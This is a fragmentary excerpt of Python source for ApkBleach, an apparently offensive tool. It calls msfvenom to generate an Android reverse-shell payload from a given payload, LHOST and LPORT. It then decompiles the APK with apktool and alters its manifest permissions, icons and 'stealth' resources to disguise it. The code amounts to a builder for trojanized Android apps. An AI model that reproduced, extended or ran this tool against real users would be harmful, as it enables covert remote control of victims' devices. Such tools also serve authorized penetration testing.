...
class ApkBleach:
	...
	def __init__(self):
		...
		if args.list_payloads:
			...
			cache_path = pkg_resources.resource_filename(__name__, f'Resources/Cache')
		...
		self.stealth_path =  pkg_resources.resource_filename(__name__, f'Resources/Stealth') if self.stealth_num else False

		try:
			self.icon = args.icon[0]
			bleach_icons = [ i.strip('.png') for i in pkg_resources.resource_listdir("apkbleach", "Resources/Icons") ]

			if self.icon in bleach_icons:
				self.icon_path = pkg_resources.resource_filename(__name__, f'Resources/Icons/{self.icon}.png')
				# self.icon_path = __file__.replace('__main__.py', f'Resources/Icons/{self.icon}.png')
			else:
				try:
	...
	def check_dependencies(self):
		...
		if not os.path.isfile(pkg_resources.resource_filename(__name__, f'Resources/Cache/VersionKeep.txt')):
			if 'dirty' in apktool_version:
				...
				if keep_version == 'N' or keep_version == 'NO':
					...
					with open(pkg_resources.resource_filename(__name__, f'Resources/Cache/VersionKeep.txt'), "a+") as f:
	...
	def generate_payload(self):
		if self.payload and self.lhost and self.lport:
			...
			subprocess.call(
				['bash', '-c',
				f"msfvenom -p {self.payload} {self.lhost} {self.lport} --platform android -a dalvik --pad-nops -f raw -o /tmp/bleach_me.apk 2>/tmp/apkbleach_error.log 1>/dev/null"]
			)

			with open('/tmp/apkbleach_error.log') as f:
	...
	def decompile_apk(self):
		self.decompiled_path = '/tmp/apkbleach/Decompiled'

		subprocess.call(['bash', '-c', "_SILENT_JAVA_OPTIONS=\"$_JAVAOPTIONS\" && unset _JAVA_OPTIONS && alias JAVA='java \"_SILENT_JAVA_OPTIONS\"'"])

		subprocess.call(['bash', '-c', f'apktool -q -f d /tmp/bleach_me.apk -o {self.decompiled_path}  &>/dev/null'])	
	...
	def bleach_apk(self):
		...
		if self.edit_permissions:
			...
			with open('/tmp/apkbleach/Decompiled/AndroidManifest.xml', 'r+') as manifest:
